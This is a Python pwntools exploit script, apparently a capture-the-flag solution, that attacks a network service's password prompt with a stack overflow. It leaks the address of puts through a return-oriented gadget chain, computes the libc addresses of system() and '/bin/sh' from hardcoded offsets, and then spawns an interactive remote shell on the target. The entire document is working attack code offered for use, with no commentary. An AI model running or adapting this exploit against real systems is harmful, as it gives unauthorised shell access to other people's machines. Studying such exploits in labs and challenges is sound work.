from pwn import*
from LibcSearcher import*
context.log_level = "debug"

p = remote('192.168.10.185',4444)

puts_plt = 0x400560
puts_got = 0x601018
brop_gadget = 0x4007ba
stop_gadget = 0x4005c0
rdi_ret = brop_gadget + 9
payload = 'a'*72 + p64(rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(stop_gadget)
p.recvuntil("password?\n")
p.sendline(payload)
data = p.recv(6).ljust(8,'\x00')
p.recv()
puts_addr = u64(data)
print "puts address :0x%x"%puts_addr
libc = LibcSearcher('puts',puts_addr)
libc_base = puts_addr - 0x000000000006f690
system  = libc_base + 0x0000000000045390
binsh = libc_base + 0x18cd57
payload = 'a'*72 + p64(rdi_ret) + p64(binsh) + p64(system) + p64(stop_gadget)
p.sendline(payload)
p.interactive()
